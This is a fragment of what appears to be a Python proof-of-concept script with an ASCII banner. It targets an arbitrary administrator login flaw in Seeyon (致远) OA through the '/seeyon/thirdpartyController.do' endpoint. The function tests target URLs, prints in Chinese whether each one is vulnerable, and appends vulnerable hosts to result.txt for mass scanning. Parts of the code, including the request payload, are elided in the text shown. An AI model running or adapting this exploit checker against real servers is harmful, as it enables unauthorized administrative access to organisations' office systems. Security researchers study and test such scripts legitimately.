...
\____    /|  |__ |__\__  |   |__ _______    ____  \_____  \    /  _  \  
  /     / |  |  \|  |/   |   |  |  \__  \  /    \  /   |   \  /  /_\  \ 
 /     /_ |   Y  \  |\____   |  |  // __ \|   |  \/    |    \/    |    \
/_______ \|___|  /__|/ ______|____/(____  /___|  /\_______  /\____|__  /
        \/     \/    \/                 \/     \/         \/         \/ 
                                     info:致远OA任意管理员登录
	"""
	print(banner)
def poc(target):
	payload_url = "/seeyon/thirdpartyController.do"
	...
	try:
		...
		if res.status_code == 200:
			if res1.status_code == 200 and "异常处理页面" not in res1.text:
		
				print(f"{GREEN}[+]该url存在任意用户登录漏洞：{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在任意用户登录漏洞：{target}")
		else:
